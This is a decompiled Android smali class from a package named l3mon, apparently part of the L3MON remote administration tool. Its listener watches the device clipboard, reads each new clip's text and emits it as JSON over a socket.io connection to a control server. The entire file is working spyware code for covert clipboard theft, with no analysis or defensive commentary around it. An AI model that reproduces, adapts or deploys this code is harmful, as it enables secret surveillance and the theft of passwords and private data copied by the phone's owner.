.class Lcom/etechd/l3mon/MainService$1;
.super Ljava/lang/Object;
.source "MainService.java"

# interfaces
.implements Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/etechd/l3mon/MainService;->onStartCommand(Landroid/content/Intent;II)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/etechd/l3mon/MainService;


# direct methods
.method constructor <init>(Lcom/etechd/l3mon/MainService;)V
    .locals 0
    .param p1, "this$0"    # Lcom/etechd/l3mon/MainService;

    .line 44
    iput-object p1, p0, Lcom/etechd/l3mon/MainService$1;->this$0:Lcom/etechd/l3mon/MainService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPrimaryClipChanged()V
    .locals 8

    .line 46
    iget-object v0, p0, Lcom/etechd/l3mon/MainService$1;->this$0:Lcom/etechd/l3mon/MainService;

    const-string v1, "clipboard"

    invoke-virtual {v0, v1}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/ClipboardManager;

    .line 47
    .local v0, "clipboard":Landroid/content/ClipboardManager;
    invoke-virtual {v0}, Landroid/content/ClipboardManager;->hasPrimaryClip()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 48
    invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    move-result-object v1

    .line 49
    .local v1, "clipData":Landroid/content/ClipData;
    invoke-virtual {v1}, Landroid/content/ClipData;->getItemCount()I

    move-result v2

    if-lez v2, :cond_0

    .line 50
    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/content/ClipData;->getItemAt(I)Landroid/content/ClipData$Item;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/ClipData$Item;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    .line 51
    .local v3, "text":Ljava/lang/CharSequence;
    if-eqz v3, :cond_0

    .line 53
    :try_start_0
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 54
    .local v4, "data":Lorg/json/JSONObject;
    const-string v5, "text"

    invoke-virtual {v4, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 55
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v5

    invoke-virtual {v5}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v5

    const-string v6, "0xCB"

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/Object;

    aput-object v4, v7, v2

    invoke-virtual {v5, v6, v7}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 58
    nop

    .end local v4    # "data":Lorg/json/JSONObject;
    goto :goto_0

    .line 56
    :catch_0
    move-exception v2

    .line 57
    .local v2, "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    .line 62
    .end local v1    # "clipData":Landroid/content/ClipData;
    .end local v2    # "e":Lorg/json/JSONException;
    .end local v3    # "text":Ljava/lang/CharSequence;
    :cond_0
    :goto_0
    return-void
.end method
